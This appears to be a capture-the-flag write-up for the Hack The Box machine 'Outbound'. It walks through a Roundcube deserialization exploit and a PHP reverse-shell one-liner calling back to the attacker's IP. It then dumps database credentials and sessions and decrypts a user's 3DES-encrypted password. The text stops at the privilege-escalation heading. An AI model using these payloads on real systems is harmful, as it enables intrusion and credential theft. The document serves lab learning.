![[Outbound-00.png]]
## Given Information
```username
tyler
```

```password
LhKL1o9Nm3X2
```

## Network Scan

### Rustscan

```bash
rustscan -a 10.10.11.77
```

#### Output

```bash
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
0day was here ♥

[~] The config file is expected to be at "/root/.rustscan.toml"
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.10.11.77:22
Open 10.10.11.77:80
[~] Starting Script(s)
[~] Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-24 11:28 UTC
Initiating Ping Scan at 11:28
Scanning 10.10.11.77 [4 ports]
Completed Ping Scan at 11:28, 0.09s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 11:28
Completed Parallel DNS resolution of 1 host. at 11:28, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 11:28
Scanning 10.10.11.77 [2 ports]
Discovered open port 80/tcp on 10.10.11.77
Discovered open port 22/tcp on 10.10.11.77
Completed SYN Stealth Scan at 11:28, 0.11s elapsed (2 total ports)
Nmap scan report for 10.10.11.77
Host is up, received echo-reply ttl 62 (0.065s latency).
Scanned at 2025-07-24 11:28:53 UTC for 0s

PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.34 seconds
           Raw packets sent: 6 (240B) | Rcvd: 3 (116B)

```

So we have 2 ports open ssh and http, lets enumerate further!

## Enumeration

Opening the website in Web Browser redirected us to `mail.outbout.htb` let's add that to our `/etc/hosts` file before beginning the web enumeration.

```bash
sudo echo "10.10.11.77 outbound.htb mail.outbound.htb" >> /etc/hosts
```

### WebApp Enumeration(Manual Approach)

| ![[Outbound-01.png]] |
| :------------------: |
|     *RoundCube*      |
* Its a roundcube mail interface lets login using the default password and check if we can enumerate further.

|    ![[Outbound-02.png]]     |
| :-------------------------: |
| *Roundcube Webmail Version* |
* After logging in there wasn't much to find but i got the version of Roundcube webmail.

### CVE-2025-49113
* After checking the Version on the web, we found out that the Roundcube version 1.16.10 is vulnerable to PHP object deserialization flaw.[Reference](https://www.offsec.com/blog/cve-2025-49113/)
* We also found a working exploit on [Github](https://github.com/fearsoff-org/CVE-2025-49113)
## Initial Foothold
Let's Clone the exploit repo and exploit the vulnerability.
```bash
git clone https://github.com/fearsoff-org/CVE-2025-49113
cd CVE-2025-49113/
```

We can execute code on the remote machine so lets try getting a reverse shell, most of the payloads didn't work so i used this PHP payload.

```bash
php -r '\$s=fsockopen(\"$tun0\",4444);\$p=proc_open(\"/bin/sh\",[0=>\$s,1=>\$s,2=>\$s],\$pipes);'
```
Where $tun0 is my vpn ip and 4444 is the port i am listening on.

Final command to get the shell

```bash
php CVE-2025-49113.php http://mail.outbound.htb tyler LhKL1o9Nm3X2 "php -r '\$s=fsockopen(\"10.10.16.11\",4444);\$p=proc_open(\"/bin/sh\",[0=>\$s,1=>\$s,2=>\$s],\$pipes);'"
```

I got a reverse shell on my pwncat shell (You can also use Netcat).

```bash
pwncat-cs -lp 4444
```

Output
```bash
[20:58:28] 10.10.11.77:44592: upgrading from /usr/bin/dash to /usr/bin/bash                                                                                                     manager.py:957
[20:58:32] 10.10.11.77:44592: registered new host w/ db                                                                                                                         manager.py:957
[20:58:40] listener: 0.0.0.0:4444: linux session from 10.10.11.77:44592 established                                                                                             manager.py:957
```

Hit Ctrl + d

We got a shell from the user www-data!

### Escaping the docker

* First lets switch user to Tyler since we know the password and we can enumerate further for any privilege escalation vector 
```bash
www-data@mail.outbound.htb:/var/www/html/roundcube/public_html$ su tyler
```

Enter the password of tyler and boom!

| ![[Outbound-03.png]] |
| :------------------: |
| *A shell with tyler* |
We didn't find much in Tyler and there was no flag in home directory of Tyler.
After a few manual enumeration i saw .dockerenv file in the root directory making it obvious that we are in a docker container, i started looking for docker breakout but could not find anything useful so i ran linpeas and found this

|  ![[Outbound-04.png]]   |
| :---------------------: |
| *Roundcube config file* |
From here we can use the mysql creds to access the db and extract information from there.
```bash
mysql -u roundcube -p
```

Then enter the password:
```DBpass
RC{REDACTED}5
```
After that lets use the roundcube db and check out the tables
```mysql
use roundcube;
```

now look for tables
```mysql
show tables;
```

Output

```mysql
MariaDB [roundcube]> show tables;
+---------------------+
| Tables_in_roundcube |
+---------------------+
| cache               |
| cache_index         |
| cache_messages      |
| cache_shared        |
| cache_thread        |
| collected_addresses |
| contactgroupmembers |
| contactgroups       |
| contacts            |
| dictionary          |
| filestore           |
| identities          |
| responses           |
| searches            |
| session             |
| system              |
| users               |
+---------------------+
17 rows in set (0.001 sec)
```

Lets dump the data of `users` table and see if we find anythinf useful

```mysql
SELECT * FROM users;
```

Output

```mysql
MariaDB [roundcube]> SELECT * FROM users;
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
| user_id | username | mail_host | created             | last_login          | failed_login        | failed_login_counter | language | preferences                                               |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
|       1 | jacob    | localhost | 2025-06-07 13:55:18 | 2025-07-26 22:33:24 | 2025-07-27 04:31:36 |                    1 | en_US    | a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}         |
|       2 | mel      | localhost | 2025-06-08 12:04:51 | 2025-06-08 13:29:05 | NULL                |                 NULL | en_US    | a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}         |
|       3 | tyler    | localhost | 2025-06-08 13:28:55 | 2025-07-27 04:21:15 | 2025-06-11 07:51:22 |                    1 | en_US    | a:2:{s:11:"client_hash";s:16:"WssE42vCcbbLL2om";i:0;b:0;} |
+---------+----------+-----------+---------------------+---------------------+---------------------+----------------------+----------+-----------------------------------------------------------+
3 rows in set (0.001 sec)

```

We find 3 users...hmm but there are no valid hashes but in the roundcube config file we found something interesting

```3des-key
rcmail-!24ByteDESkey*Str
```
The hashes are stored as 3DES hash we can try to decode it but we dont have a valid client hash

After further enumeration i found sessions table where we have sessions encoded in base64 format

```mysql
SELECT * FROM session;
```
Output

```mysql
MariaDB [roundcube]> SELECT * FROM session;
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| sess_id                    | changed             | ip         | vars                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| 6a5ktqih5uca6lj8vrmgh9v0oh | 2025-06-08 15:46:40 | 172.17.0.1 | bGFuZ3VhZ2V8czo1OiJlbl9VUyI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e{REDACTED}Vzc2FnZWxpc3QiO3M6OToiZGF0YS1saXN0IjtzOjEyOiJtZXNzYWdlX2xpc3QiO3M6MTQ6ImRhdGEtbGFiZWwtbXNnIjtzOjE4OiJUaGUgbGlzdCBpcyBlbXB0eS4iO311bnNlZW5fY291bnR8YToyOntzOjU6IklOQk9YIjtpOjI7czo1OiJUcmFzaCI7aTowO31mb2xkZXJzfGE6MTp7czo1OiJJTkJPWCI7YToyOntzOjM6ImNudCI7aToyO3M6NjoibWF4dWlkIjtpOjM7fX1saXN0X21vZF9zZXF8czoyOiIxMCI7 |
+----------------------------+---------------------+------------+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)

```

Lets copy the var and paste it on cyberchef

|    ![[Outbound-05.png]]    |
| :------------------------: |
| *CyberChef base64 decoded* |
In cyber chef we got the output for the session,

```PlainText
language|s:5:"en_US";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:"/";}}s:5:"other";N;s:6:"shared";N;s:10:"prefix_out";s:0:"";}imap_delimiter|s:1:"/";imap_list_conf|a:2:{i:0;N;i:1;a:0:{}}user_id|i:1;username|s:5:"jacob";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|b:0;password|s:32:"L7Rv0{REDACTED}SgnIk25Am/";login_time|i:1749397119;timezone|s:13:"Europe/London";STORAGE_SPECIAL-USE|b:1;auth_secret|s:26:"DpYqv{REDACTED}hcCd8JaQQW";request_token|s:32:"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw";task|s:4:"mail";skin_config|a:7:{s:17:"supported_layouts";a:1:{i:0;s:10:"widescreen";}s:22:"jquery_ui_colors_theme";s:9:"bootstrap";s:18:"embed_css_location";s:17:"/styles/embed.css";s:19:"editor_css_location";s:17:"/styles/embed.css";s:17:"dark_mode_support";b:1;s:26:"media_browser_css_location";s:4:"none";s:21:"additional_logo_types";a:3:{i:0;s:4:"dark";i:1;s:5:"small";i:2;s:10:"small-dark";}}imap_host|s:9:"localhost";page|i:1;mbox|s:5:"INBOX";sort_col|s:0:"";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:6:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:42:"listing messagelist sortheader fixedheader";s:15:"aria-labelledby";s:22:"aria-label-messagelist";s:9:"data-list";s:12:"message_list";s:14:"data-label-msg";s:18:"The list is empty.";}unseen_count|a:2:{s:5:"INBOX";i:2;s:5:"Trash";i:0;}folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:2;s:6:"maxuid";i:3;}}list_mod_seq|s:2:"10";
```

There are alot of information but we only need a valid username and its respective client hash.

From te above base64 decoded we will need the following

```username
jacob
```

```Hash
L7Rv00A{REDACTED}k25Am/
```

```Auth-secret
DpYqv{REDACTED}QQW
```

Using the above we can now decrypt the 3DES encrypted password of jacob

Now what we have to do take the `des-key` from config file , hash from extracted b64 session id and chain it together to decrypt 3DES encryption.

Go to [Cyberchef](https://gchq.github.io/CyberChef) and decrypt the hash as follow

From bs64(Alphabet Standard) --> Hex(Byte per line 8)

| ![[Outbound-06.png]] |
| :------------------: |
|    *Cyberchef 1*     |

**Make sure that b64 also decodes `/`**

Now open a different tab with CyberChef and from the list select triple DES.
	1. In key select UTF-8 and put the des key we found in config file.
	2. In IV put the first line (8bytes) of the output in CyberChef 1.
	3. Keep the mode CBC.
	4. Input type as hex
	5. Output as Raw.
	6. The input in CyberChef 2 will be the last 2 lines(16bytes) of CyberChef1.

| ![[Outbound-07.png]] |
| :------------------: |
|    *CyberChef 2*     |
In the output we will get the password for jacob 
```password
595{REDACTED}D
```

Now lets switch user to Jacob in our docker container shell
```bash
su jacob
```

To look for important files in jacobs home dir we can simply run

```bash
find
```

Output
```bash

jacob@mail:~$ find
.
./.profile
./mail
./mail/Trash
./mail/.imap
./mail/.imap/Trash
./mail/.imap/Trash/dovecot.index.cache
./mail/.imap/Trash/dovecot.index.log
./mail/.imap/dovecot.mailbox.log
./mail/.imap/INBOX
./mail/.imap/INBOX/dovecot.index.cache
./mail/.imap/INBOX/dovecot.index.log
./mail/.imap/dovecot.list.index.log
./mail/.imap/dovecot-uidvalidity
./mail/.imap/dovecot-uidvalidity.684445b1
./mail/.subscriptions
./mail/INBOX
./mail/INBOX/.imap
./mail/INBOX/.imap/jacob
./mail/INBOX/.imap/jacob/dovecot.index.cache
./mail/INBOX/.imap/jacob/dovecot.index.log
./mail/INBOX/jacob
./.bash_logout
./.bash_history
./.bashrc
```

We can check if there is any mail for Jacob in mail/INBOX

```bash
cat mail/INBOX/jacob
```

Output
```bash
jacob@mail:~$ cat mail/INBOX/jacob 
From tyler@outbound.htb  Sat Jun 07 14:00:58 2025
Return-Path: <tyler@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1000)
	id B32C410248D; Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
To: jacob@outbound.htb
Subject: Important Update
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250607140058.B32C410248D@outbound.htb>
Date: Sat,  7 Jun 2025 14:00:58 +0000 (UTC)
From: tyler@outbound.htb
X-IMAPbase: 1749304753 0000000002
X-UID: 1
Status: 
X-Keywords:                                                                       
Content-Length: 233

Due to the recent change of policies your password has been changed.

Please use the following credentials to log into your account: {REDACTED}

Remember to change your password when you next log into your account.

Thanks!

Tyler

From mel@outbound.htb  Sun Jun 08 12:09:45 2025
Return-Path: <mel@outbound.htb>
X-Original-To: jacob
Delivered-To: jacob@outbound.htb
Received: by outbound.htb (Postfix, from userid 1002)
	id 1487E22C; Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
To: jacob@outbound.htb
Subject: Unexpected Resource Consumption
MIME-Version: 1.0
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: 8bit
Message-Id: <20250608120945.1487E22C@outbound.htb>
Date: Sun,  8 Jun 2025 12:09:45 +0000 (UTC)
From: mel@outbound.htb
X-UID: 2
Status: 
X-Keywords:                                                                       
Content-Length: 261

We have been experiencing high resource consumption on our main server.
For now we have enabled resource monitoring with Below and have granted you privileges to inspect the the logs.
Please inform us immediately if you notice any irregularities.

Thanks!

Mel

```

We got the password for jacob in main machine outside of docker!

Lets SSH into jacob in the main machine and grab the user flag
```bash
ssh jacob@outbound.htb
```

```bash
cat user.txt 
```
### Flag 1
```Flag1
ff3fc66{REDACTED}169f9a37
```

## Privilege Escalation
